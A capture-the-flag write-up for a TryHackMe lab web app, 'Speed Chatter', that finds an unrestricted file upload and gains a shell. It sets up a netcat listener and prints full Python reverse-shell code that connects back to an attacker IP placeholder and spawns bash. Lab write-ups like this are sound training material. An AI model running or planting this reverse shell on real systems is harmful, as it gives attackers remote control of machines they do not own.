```
  ()                      __                          
  /\                /    /  )/       _/__/_           
 /  )  _   _  _  __/    /   /_  __.  /  /  o ____  _, 
/__/__/_)_</_</_(_/_   (__// /_(_/|_<__<__<_/ / <_(_)_
     /                                             /| 
    '                                             |/
```
Days before Valentine's Day, TryHeartMe rushed out a new messaging platform called
"Speed Chatter", promising instant connections and private conversations. But in the
race to beat the holiday deadline, security took a back seat. Rumours are circulating
that "Speed Chatter" was pushed to production without proper testing. As a security
researcher, it's your task to break into "Speed Chatter", uncover flaws, and expose
TryHeartMe's negligence before the damage becomes irreversible. [^1]

Can you hack as fast as you can chat?
-----------------------------------------------------------------------------------------
Upon accessing the *Speed Chat Room* on `http://<TARGET_MACHINE_IP>:5000` we are prompted
with an option to chat and upload a photo. First, we investigate the messaging procedure
for potential XSS attacks. However, we can notice HTML encoding to prevent the execution
of JavaScript code as in `&lt;script&gt;` so we move on to the investigate the photo
uploading in hopes of finding a file upload vulnerability. First, it is noticeable that
the port *5000* of the web application indicates that it might run on Flask, a Python web
framework. Second, we try to upload a Python file with success and suspect there to be
missing type recognition. So, we start to search for reverse shells on Python to spawn a
shell on our attacking machine. By changing the IP and port in the *Reverse Shell
Generator* [^2], we can simply copy and paste a few of our choice into a script that is
then uploaded to the vulnerable web application. Before we do that, we first create a
listener with `nc -nlvp 8080` and then try a few of them out. Finally, we succeed with
the following reverse shell, with which we can retrieve the flag in the current
directory.

```python
import socket
import os
import pty

def create_reverse_shell(target_ip, target_port):
    # Create a new TCP socket object using IPv4 connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to the target IP and port as specified in main
    s.connect((target_ip, target_port))

    # Redirect standard input, output, and error to the socket
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    # Spawn a bash shell (unstable but enough for this purpose)
    pty.spawn("/bin/bash")

if __name__ == "__main__":
    target_ip = "<ATTACKING_MACHINE_IP>"
    target_port = 8080
    create_reverse_shell(target_ip, target_port)
```

[^1]: https://tryhackme.com/room/lafb2026e4
[^2]: https://www.revshells.com/
